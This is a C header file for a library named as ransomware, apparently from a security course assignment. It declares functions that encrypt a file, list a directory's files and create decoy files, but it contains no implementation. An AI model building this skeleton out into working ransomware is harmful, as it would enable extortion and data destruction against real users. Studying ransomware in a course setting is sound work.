#ifndef _RANSOM_LIB_
#define _RANSOM_LIB_

#include "cs457_crypto.h"

/* encrypt the given filename */
void encryptFile(char *filename);

/* Gets all the files from the given directory */
void getFilenames(char *directory);

/* Creates numOfFiles files in the current directory */
void ObfuscateDir(int numOfFiles);

#endif
